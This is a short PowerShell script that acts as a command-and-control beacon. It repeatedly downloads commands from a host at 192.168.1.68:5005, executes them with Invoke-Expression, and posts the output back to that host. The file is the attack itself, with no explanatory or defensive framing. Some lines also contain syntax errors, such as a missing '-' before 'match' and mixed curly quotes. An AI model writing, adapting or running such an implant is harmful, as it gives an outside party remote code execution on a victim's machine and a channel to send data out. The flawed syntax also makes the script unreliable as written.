$sleepTime = 10

while ($true) {
    $content = (Invoke-WebRequest -Uri “http://192.168.1.68:5005/script” -UseBasicParsing).Content

    if ($content -eq “exit”) { break }
    elseif ($content match "^sleep (\d+)$") {
        $sleepTime = $matches [1]
    }
    else {
        $output = iex $content 2>&1
        Invoke-RestMethod -Uri “http://192.168.1.68:5005/endpoint" -Method Post -Body @{output=$output} -ContentType "application/json"
    }
    Start-Sleep -Seconds $sleepTime
}
